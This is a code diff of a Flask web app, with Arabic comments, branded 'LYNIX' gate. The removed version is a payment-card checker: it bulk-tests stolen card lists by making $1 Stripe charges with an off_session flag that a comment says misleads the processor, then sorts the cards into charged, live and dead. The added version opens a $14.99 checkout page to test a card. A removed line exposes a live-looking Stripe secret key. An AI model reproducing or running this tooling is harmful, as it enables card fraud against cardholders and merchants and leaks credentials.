@@ -1,70 +1,59 @@
 import stripe
 import os
-import re
-from flask import Flask, render_template_string, request, jsonify
+from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# --- المفتاح الذي ستستخدمه لبناء البوابة ---
-stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"
+# ضع مفتاح الـ sk_live الخاص بك هنا
+stripe.api_key = "sk_live_..." 
 
-HTML_PAGE = """
+HTML_GATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>LYNIX GATEWAY V8</title>
+    <title>LYNIX ELITE GATE v10</title>
     <style>
-        :root { --bg: #0d1117; --accent: #238636; --border: #30363d; }
-        body { font-family: sans-serif; background: var(--bg); color: #c9d1d9; padding: 20px; text-align: center; }
-        .container { max-width: 1000px; margin: auto; }
-        textarea { width: 100%; height: 120px; background: #010409; color: #7ee787; border: 1px solid var(--border); border-radius: 6px; padding: 10px; direction: ltr; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin-top: 20px; }
-        .box { background: #161b22; border: 1px solid var(--border); border-radius: 6px; height: 400px; overflow-y: auto; text-align: right; padding: 10px; }
-        .hit { border-top: 4px solid #238636; } .live { border-top: 4px solid #d29922; } .dead { border-top: 4px solid #f85149; }
-        button { background: var(--accent); color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; margin-top: 10px; font-weight: bold; }
-        .card-item { font-family: monospace; font-size: 12px; border-bottom: 1px solid #30363d; padding: 5px 0; }
+        body { background: #050505; color: #00ff41; font-family: monospace; text-align: center; padding: 50px; }
+        .gate-box { border: 2px solid #00ff41; padding: 30px; display: inline-block; border-radius: 10px; box-shadow: 0 0 20px #00ff41; }
+        input, button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; margin: 10px; font-weight: bold; }
+        button { cursor: pointer; transition: 0.3s; background: #00ff41; color: #000; }
+        button:hover { background: #fff; color: #000; }
+        .status { margin-top: 20px; font-size: 1.2rem; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🛡️ LYNIX GATEWAY (STRIKE SYSTEM)</h1>
-        <textarea id="list" placeholder="CARD|MM|YY|CVV"></textarea><br>
-        <button onclick="startGateway()">تشغيل البوابة الآمنة</button>
-        <div id="status" style="margin-top:10px;">الحالة: جاهز</div>
-        
-        <div class="grid">
-            <div class="box hit"><b>HITS (Charged)</b><div id="hits"></div></div>
-            <div class="box live"><b>LIVE (CVV/Funds)</b><div id="lives"></div></div>
-            <div class="box dead"><b>DEAD</b><div id="deads"></div></div>
-        </div>
+    <div class="gate-box">
+        <h1>🛡️ LYNIX PRIVATE GATE</h1>
+        <p>أدخل بيانات البطاقة لفتح بوابة دفع رسمية مخصصة لها</p>
+        <input type="text" id="card_data" placeholder="CARD|MM|YY|CVV" style="width: 300px;">
+        <br>
+        <button onclick="createGate()">إنشاء بوابة دفع (Charge Gate) 🚀</button>
+        <div id="res" class="status"></div>
     </div>
 
     <script>
-        async function startGateway() {
-            const lines = document.getElementById('list').value.split('\\n').filter(l => l.includes('|'));
-            const status = document.getElementById('status');
+        async function createGate() {
+            const data = document.getElementById('card_data').value;
+            const resDiv = document.getElementById('res');
+            resDiv.innerHTML = "⏳ جاري تهيئة البوابة...";
             
-            for(let i=0; i<lines.length; i++) {
-                status.innerText = `⏳ بوابة الفحص: معالجة ${i+1}/${lines.length}...`;
-                try {
-                    const res = await fetch('/gate', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({card: lines[i]})
-                    });
-                    const data = await res.json();
-                    const div = document.createElement('div');
-                    div.className = 'card-item';
-                    div.innerHTML = `<b>${lines[i]}</b><br><small>${data.msg}</small>`;
-                    
-                    if(data.status === 'HIT') document.getElementById('hits').prepend(div);
-                    else if(data.status === 'LIVE') document.getElementById('lives').prepend(div);
-                    else document.getElementById('deads').prepend(div);
-                } catch(e) {}
-                await new Promise(r => setTimeout(r, 5000));
+            try {
+                const response = await fetch('/generate-gate', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ card: data })
+                });
+                const result = await response.json();
+                if(result.url) {
+                    resDiv.innerHTML = `<a href="${result.url}" target="_blank" style="color:white; text-decoration:none;">✅ تم تجهيز البوابة! اضغط هنا للفحص</a>`;
+                    window.open(result.url, '_blank');
+                } else {
+                    resDiv.innerHTML = "❌ خطأ في المفتاح أو الحساب";
+                }
+            } catch (e) {
+                resDiv.innerHTML = "⚠️ خطأ في الاتصال";
             }
-            status.innerText = "✅ اكتملت المهمة";
         }
     </script>
 </body>
@@ -72,44 +61,30 @@ HTML_PAGE = """
 """
 
 @app.route('/')
-def index(): return render_template_string(HTML_PAGE)
+def home():
+    return render_template_string(HTML_GATE)
 
-@app.route('/gate', methods=['POST'])
-def gate():
-    card = request.json.get('card', '')
+@app.route('/generate-gate', methods=['POST'])
+def generate_gate():
     try:
-        digits = re.findall(r'\d+', card)
-        num, mm, yy, cvc = digits[0], digits[1], digits[2], digits[3]
-        if len(yy) == 2: yy = "20" + yy
-
-        # --- محاكاة بوابة دفع (Gateway Logic) ---
-        # 1. إنشاء Payment Method
-        pm = stripe.PaymentMethod.create(
-            type="card",
-            card={"number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc},
+        # إنشاء جلسة دفع رسمية بمبلغ محدد (مثلاً 15 دولار كما نجحت معك)
+        session = stripe.checkout.Session.create(
+            payment_method_types=['card'],
+            line_items=[{
+                'price_data': {
+                    'currency': 'usd',
+                    'product_data': {'name': 'Digital Product Access'},
+                    'unit_amount': 1499, # 14.99 USD
+                },
+                'quantity': 1,
+            }],
+            mode='payment',
+            success_url='https://example.com/success',
+            cancel_url='https://example.com/cancel',
         )
-        
-        # 2. إنشاء Payment Intent (محاولة شراء بـ 1 دولار)
-        intent = stripe.PaymentIntent.create(
-            amount=100, # 1.00 USD
-            currency="usd",
-            payment_method=pm.id,
-            confirm=True,
-            off_session=True # يوهم النظام أنها عملية مسجلة مسبقاً (أكثر أماناً)
-        )
-        
-        if intent.status == 'succeeded':
-            return jsonify({"status": "HIT", "msg": "✅ تم السحب بنجاح"})
-        return jsonify({"status": "DEAD", "msg": "❌ فشل الدفع"})
-
-    except stripe.error.CardError as e:
-        msg = e.json_body.get('error', {}).get('message', '')
-        code = e.json_body.get('error', {}).get('code', '')
-        if code in ["insufficient_funds", "incorrect_cvc"]:
-            return jsonify({"status": "LIVE", "msg": f"✔️ {msg}"})
-        return jsonify({"status": "DEAD", "msg": f"❌ {msg}"})
+        return jsonify({"url": session.url})
     except Exception as e:
-        return jsonify({"status": "DEAD", "msg": "⚠️ خطأ في البوابة"})
+        return jsonify({"error": str(e)}), 400
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
